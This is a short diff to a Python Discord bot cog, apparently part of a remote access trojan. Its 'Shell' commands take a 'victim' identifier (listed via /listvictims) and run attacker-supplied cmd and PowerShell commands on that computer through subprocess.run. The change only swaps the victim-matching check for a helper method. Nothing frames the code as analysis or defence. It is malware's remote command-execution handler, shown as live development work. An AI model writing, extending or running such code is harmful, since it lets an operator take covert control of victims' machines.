@@ -19,7 +19,7 @@ class Shell(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         command: The cmd command to be executed
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             output = subprocess.run(
@@ -58,7 +58,7 @@ class Shell(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         command: The powershell command to be executed
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             await ctx.response.defer()
             
             output = subprocess.run(
